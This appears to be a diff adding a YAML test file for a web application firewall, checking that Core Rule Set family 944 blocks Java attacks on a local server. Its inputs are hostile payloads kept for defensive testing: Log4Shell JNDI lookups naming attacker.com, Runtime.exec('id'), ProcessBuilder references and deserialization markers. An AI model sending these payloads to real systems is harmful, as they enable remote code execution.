@@ -1,0 +1,113 @@
+---
+meta:
+  author: "Developmi"
+  description: "CRS 4.29.0 Family 944 - Java Attacks & Log4Shell"
+  enabled: true
+  name: "crs-944-attack-java"
+
+rule_id: 944000
+
+tests:
+  - test_title: "Log4Shell JNDI injection in query - WAF should block"
+    test_id: 1
+    description: "CRS rule 944150. JNDI lookup syntax ${jndi:ldap://...} triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?leak=${jndi:ldap://attacker.com/exploit}"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Log4Shell in User-Agent header - WAF should block"
+    test_id: 2
+    description: "CRS rule 944150. JNDI lookup in header triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/"
+            method: "GET"
+            headers:
+              User-Agent: "${jndi:rmi://10.0.0.1/exploit}"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Java runtime process execution - WAF should block"
+    test_id: 3
+    description: "CRS rule 944100. java.lang.runtime execution attempt triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?class=java.lang.runtime.getruntime().exec('id')"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Java ProcessBuilder execution - WAF should block"
+    test_id: 4
+    description: "CRS rule 944100. java.lang.processbuilder reference triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?exec=java.lang.processbuilder"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Java serialization magic bytes (Base64) - WAF should block"
+    test_id: 5
+    description: "CRS rule 944210. Base64 encoded Java serialization magic bytes trigger 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/post"
+            method: "POST"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU="
+          output:
+            status: [403]
+
+  - test_title: "Java InvokerTransformer gadget - WAF should block"
+    test_id: 6
+    description: "CRS rule 944120. InvokerTransformer deserialization gadget triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?gadget=invokertransformer"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
